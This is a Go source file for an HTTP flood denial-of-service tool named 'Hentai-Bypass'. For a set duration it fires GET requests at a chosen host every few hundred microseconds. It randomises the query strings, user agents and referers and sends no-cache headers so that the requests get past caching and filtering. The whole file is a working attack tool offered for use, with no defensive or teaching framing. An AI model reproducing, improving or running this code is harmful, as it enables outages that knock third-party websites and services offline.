package main

import (
    "bufio"
    "flag"
    "fmt"
    "math/rand"
    "net/http"
    "os"
    "os/signal"
    "strings"
    "sync/atomic"
    "syscall"
    "time"

    "github.com/corpix/uarand"
    "github.com/gookit/color"
)

var (
    referers     []string
    host         string
    param_joiner string
    reqCount     uint64
    duration     time.Duration
    stopFlag     int32
    proxyList    string
)

func buildblock(size int) (s string) {
    var a []rune
    for i := 0; i < size; i++ {
        a = append(a, rune(rand.Intn(75)+1555))
    }
    return string(a)
}

func get() {
    if strings.ContainsRune(host, '?') {
        param_joiner = "&"
    } else {
        param_joiner = "?"
    }

    c := http.Client{
        Timeout: 3500 * time.Millisecond,
    }

    req, err := http.NewRequest("GET", host+param_joiner+buildblock(rand.Intn(80)+3)+"="+buildblock(rand.Intn(7)+3), nil)
    if err != nil {
        fmt.Println(err)
    }

    req.Header.Set("User-Agent", uarand.GetRandom())
    req.Header.Add("Pragma", "no-cache")
    req.Header.Add("Cache-Control", "no-store, no-cache")
    req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9")
    req.Header.Set("Accept-Language", "en-US,en;q=0.9")
    req.Header.Set("Accept-Encoding", "gzip, deflate, br")
    req.Header.Set("sec-fetch-site", "cross-site")
    req.Header.Set("Referer", referers[rand.Intn(len(referers))]+buildblock(rand.Intn(5)+5))
    req.Header.Set("Keep-Alive", string(rand.Intn(10)+100))
    req.Header.Set("Connection", "keep-alive")

    resp, err := c.Do(req)

    atomic.AddUint64(&reqCount, 1)

    if os.IsTimeout(err) {
        color.Red.Println("Connection timed out err")
    } else {
        color.Green.Println("Attacking Hentai-Bypass To : ", host)
    }

    if err != nil {
        return
    }

    defer resp.Body.Close()
}

func loop() {
    for {
        if atomic.LoadInt32(&stopFlag) == 1 {
            return
        }
        go get()
        time.Sleep(200 * time.Microsecond)
    }
}

func main() {
    flag.StringVar(&host, "host", "", "Host address (e.g., https://example.com)")
    flag.StringVar(&proxyList, "proxy", "", "Proxy list file path")
    flag.DurationVar(&duration, "time", 0, "Duration for which the requests should be sent (e.g., 10s or 1m)")

    flag.Parse()

    if len(host) == 0 {
        color.Red.Println("Missing host address.")
        color.Blue.Println("Example usage:\n\t go run hentai.go --host https://example.com --time 30s")
        os.Exit(1)
    }

    if duration <= 0 {
        color.Red.Println("Invalid duration. Please specify a positive duration.")
        color.Blue.Println("Example usage:\n\t go run hentai.go  --host https://example.com --time 30s")
        os.Exit(1)
    }

    // Baca file referers.txt
    file, err := os.Open("referers.txt")
    if err != nil {
        fmt.Println(err)
        os.Exit(1)
    }
    defer file.Close()

    scanner := bufio.NewScanner(file)
    for scanner.Scan() {
        referers = append(referers, scanner.Text())
    }

    if err := scanner.Err(); err != nil {
        fmt.Println(err)
        os.Exit(1)
    }

    color.Yellow.Println("Press control+c to stop")
    time.Sleep(2 * time.Second)

    start := time.Now()

    c := make(chan os.Signal, 1)
    signal.Notify(c, os.Interrupt, syscall.SIGTERM)
    go func() {
        <-c
        atomic.StoreInt32(&stopFlag, 1)
    }()

    for i := 0; i < 2; i++ {
        go loop()
    }

    time.Sleep(duration)
    color.Blue.Println("\nSucces to Broadcast => atomic.LoadUint64(&reqCount)", "requests in", time.Since(start))
}
